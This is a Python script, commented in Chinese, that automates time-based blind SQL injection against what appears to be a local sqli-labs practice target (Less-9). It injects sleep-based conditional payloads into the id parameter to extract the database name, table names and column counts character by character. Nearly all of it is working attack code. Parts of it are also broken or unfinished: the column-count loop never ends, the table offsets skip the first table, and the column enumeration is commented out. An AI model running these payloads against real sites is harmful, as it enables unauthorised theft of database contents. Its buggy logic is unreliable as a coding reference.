import requests

# 存放数据库名变量
DBName = "security"
# 数据库表列表
DBTables = []
# 数据库字段列表
DBColumns = []
# 存放数据字典变量
DBData = {}

# 盲注主函数
def StartSqli(url):
    # GetDBName(url)

    GetTableName(url,DBName)
    print("[+]数据库{0}的表如下:".format(DBName))
    for item in range(len(DBTables)):
        print("("+ str(item+1) +")"+ DBTables[item]) 
    tableIndex = int(input("[*]请输入要查看的表的序号")) - 1
    GetDBColumns(url,DBName,DBTables[tableIndex])
    # while(1):
    #     print("[+]数据表{0}的字段如下".format(DBTables[tableIndex]))
    #     for item in range(len(DBColumns)):
    #         print("("+ str(item+1) + ")" + DBColumns[item])
    #     columnIndex = int(input("[*]请输入要查看字段的序号(输入0退出)")) -1
    #     if(columnIndex == -1):
    #         break
    #     else:
            

# 获取数据库名函数
def GetDBName(url):
    global DBName
    print("[-]开始获取数据库名长度")
    # 保存数据库名长度变量
    DBNameLength = 1
    # while 遍历请求，得到数据库名长度
    while(1):
        # 用于检查数据库名长度的payload
        payload = "' and if(length(database())={0},1,sleep(3)) --+"
        # 拼接请求URL
        targetUrl = url + payload
        # 异常响应时间的处理
        try:
            requests.get(targetUrl.format(DBNameLength),timeout=2)
        except Exception:
            print("数据库名长度:",DBNameLength,"错误")
            DBNameLength+=1
        else:
            break
    print("[+]数据库名长度:",DBNameLength)
   
   
    print("[-]开始获取数据库名")
    payload = "'and if(ascii(substr(database(),{0},1))={1},1,sleep(3)) --+"
    # 拼接URL
    targetUrl = url + payload
    # print(targetUrl)
    for a in range(1,DBNameLength + 1):
        # 所有ASCII码位
        for b in range(33,128):
            try:
                requests.get(targetUrl.format(a,b),timeout=2)
            except Exception:
                print(f"[-]正在获取数据库名第{a}个字符，第{b-32}次尝试，失败")
            else:
                DBName += chr(b)
                print(f"第{b-32}次获取成功,为: ",chr(b))
                break
    print("[+]当前数据库名:{0}".format(DBName))

# 获取数据库表函数
def GetTableName(url,DBName):
    global DBTables
    # 存放数据库表数量的变量
    DBTableCount = 0
    print("[-]开始获取{0}数据库表数量".format(DBName))
    # 获取payload
    payload = "' and if((select count(*)table_name from information_schema.tables where table_schema='{0}')={1},1,sleep(3)) --+"
    # 生成最终URL
    targetUrl = url + payload
    # 开始遍历数据库表的数量
    while(1):
            try:
                requests.get(targetUrl.format(DBName,DBTableCount),timeout=2)
            except Exception:
                print(f"[-]正在进行第{DBTableCount}次尝试")
                DBTableCount+=1
            else:
                break
    print(f"[+]{DBName}的表数量为{DBTableCount}")
    # 遍历表名时临时存放表名长度变量
    tableLen = 0
    # a表示当前正在获取表的索引
    for a in range(1,DBTableCount+1):
        print("[-]正在获取第{0}个表名".format(a))
        # 先获取当前表名的长度
        ## 获取payload
        payload = "' and if((select length(table_name) from information_schema.tables where table_schema='{0}' limit {1},1)={2},1,sleep(3)) --+"
        ## 生成最终URL
        targetUrl = url + payload
        ## 获取当前长度
        while(1):
                try:
                    requests.get(targetUrl.format(DBName,a,tableLen),timeout=2)
                except Exception:
                    tableLen += 1
                else:
                    print(f"当前表长度{tableLen}")
                    break
        # 开始获取表名
        # 临时存放当前表名的变量
        table = ""
        # b表示当前表名猜解的位置
        for b in range(1,tableLen + 1):
            payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema='{0}' limit {1},1),{2},1))={3},1,sleep(3)) --+"                
            targetUrl = url + payload
            for c in range(33, 128):
                try:
                    requests.get(targetUrl.format(DBName, a, b, c),timeout=2)
                except Exception:
                    print(f"正在获取第{a}段表名，猜解第{b}个字符，第{c-32}次失败")
                else:
                    print(f"第{c-32}次获取成功，为: ",chr(c))
                    table += chr(c)
                    
        print(f"[+]拆解完成，第{a}段表名为{table}")
        # 把获取到的名加入DBTables
        DBTables.append(table)
        # 清空table
        table = ""

def GetDBColumns(url,DBName,DBTables):
    global DBColumns
    # 存放字段数量的变量
    DBColumnCount = 0
    print("[-]开始获取{0}数据表的字段数".format(DBTables))
    while True:
        payload = "' and if((select count(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}')={2},1,sleep(3)) --+"
        targetUrl = url + payload
        try:
            requests.get(targetUrl.format(DBName, DBTables, DBColumnCount),timeout=2)
        except Exception:
            DBColumnCount+=1
            continue
        else:
            print(f"表{DBTables}字段数为{DBColumnCount}")


    







if __name__ == '__main__':
    url="http://127.0.0.1:81/Less-9/?id=1"
    StartSqli(url)